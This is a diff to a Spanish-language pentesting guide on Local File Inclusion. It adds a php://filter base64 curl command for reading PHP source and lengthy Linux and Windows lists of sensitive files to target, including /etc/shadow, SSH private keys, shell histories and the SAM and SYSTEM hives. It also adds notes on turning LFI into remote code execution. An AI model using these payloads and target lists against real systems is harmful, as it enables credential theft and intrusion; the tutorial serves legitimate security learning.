@@ -1494,6 +1494,105 @@ Otra forma también de bypassear posibles restricciones es añadiendo un interro
 
 Por [aquí](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal) os dejo un buen recurso para el uso de Wrappers y otras técnicas de bypassing.
 
+Otra consideración a tener en cuenta, es que de esta forma podemos leer archivos de texto, pero puede que de intentar visualizar archivos de extensión **.php** estos sean interpretados en vez de listados. Podemos evadir dicho problema haciendo lo siguiente:
+
+`http://localhost/file.php?file=php://filter/convert.base64-encode/resource=prueba.php`
+
+La idea para no ver **PD9waHAKCSNQcnVlYmEKPz4K1** desde la web, es aplicar el siguiente comando desde terminal:
+
+```bash
+$~ curl --silent http://localhost/file.php?file=php://filter/convert.base64-encode/resource=prueba.php | base64 -d 2>/dev/null
+
+<?php
+	#Prueba
+?>
+```
+
+Donde como vemos, se consigue visualizar el recurso PHP.
+
+Recursos interesantes siempre a mirar son los siguientes:
+
+```bash
+/etc/issue 
+/etc/motd 
+/etc/passwd 
+/etc/group 
+/etc/resolv.conf
+/etc/shadow
+/home/[USERNAME]/.bash_history o .profile
+~/.bash_history o .profile
+$USER/.bash_history o .profile
+/root/.bash_history o .profile
+/etc/mtab  
+/etc/inetd.conf  
+/var/log/dmessage
+.htaccess
+config.php
+authorized_keys
+id_rsa
+id_rsa.keystore
+id_rsa.pub
+known_hosts
+/etc/httpd/logs/acces_log 
+/etc/httpd/logs/error_log 
+/var/www/logs/access_log 
+/var/www/logs/access.log 
+/usr/local/apache/logs/access_ log 
+/usr/local/apache/logs/access. log 
+/var/log/apache/access_log 
+/var/log/apache2/access_log 
+/var/log/apache/access.log 
+/var/log/apache2/access.log
+/var/log/access_log
+.bash_history
+.mysql_history
+.my.cnf
+/proc/sched_debug
+/proc/mounts
+/proc/net/arp
+/proc/net/route
+/proc/net/tcp
+/proc/net/udp
+/proc/net/fib_trie
+/proc/version
+/proc/self/environ
+```
+
+Así como los siguientes en máquinas Windows:
+
+```bash
+c:\WINDOWS\system32\eula.txt
+c:\boot.ini  
+c:\WINDOWS\win.ini  
+c:\WINNT\win.ini  
+c:\WINDOWS\Repair\SAM  
+c:\WINDOWS\php.ini  
+c:\WINNT\php.ini  
+c:\Program Files\Apache Group\Apache\conf\httpd.conf  
+c:\Program Files\Apache Group\Apache2\conf\httpd.conf  
+c:\Program Files\xampp\apache\conf\httpd.conf  
+c:\php\php.ini  
+c:\php5\php.ini  
+c:\php4\php.ini  
+c:\apache\php\php.ini  
+c:\xampp\apache\bin\php.ini  
+c:\home2\bin\stable\apache\php.ini  
+c:\home\bin\stable\apache\php.ini
+c:\Program Files\Apache Group\Apache\logs\access.log  
+c:\Program Files\Apache Group\Apache\logs\error.log
+c:\WINDOWS\TEMP\  
+c:\php\sessions\  
+c:\php5\sessions\  
+c:\php4\sessions\
+windows\repair\SAM
+%SYSTEMROOT%\repair\SAM
+%SYSTEMROOT%\System32\config\RegBack\SAM
+%SYSTEMROOT%\System32\config\SAM
+%SYSTEMROOT%\repair\system
+%SYSTEMROOT%\System32\config\SYSTEM
+%SYSTEMROOT%\System32\config\RegBack\system
+```
+
 #### LFI to RCE
 
 Existen varias formas de conseguir ejecutar comandos en remoto a través de un **Local File Inclusion**, así como de acceder al sistema a través de la visualización de ciertos recursos. Para este caso, explicaré 3 técnicas a modo de ejemplo.
@@ -1524,6 +1623,8 @@ Llegados a este punto, si desde la URL aprovechando el LFI apuntamos a dicho rec
 Para el caso del recurso _access.log_ pasa algo similar, sólo que en cuanto a la implementación técnica se realizarn otras operaciones.
 
 Siempre suelo emplear Burpsuite como intermediario, pero también se puede hacer desde curl modificando el **User-Agent**. Lo que necesitamos hacer es realizar una consulta a la página web cambiando el User-Agent por un código PHP. De esta forma, tras visualizar el recurso _access.log_ de Apache, veremos como el código PHP es interpretado en el User-Agent de la petición en la respuesta del lado del servidor, pudiendo posteriormente ejecutar comandos en remoto de la misma forma que sucedía con el recurso _auth.log_.
+
+Otra de las técnicas para conseguir la ejecución de comandos a través de un **LFI** es por medio de archivos **proc**. Podemos encontrar la metodología paso a paso en el [siguiente recurso](https://www.exploit-db.com/papers/12992/).
 
 #### RFI
 
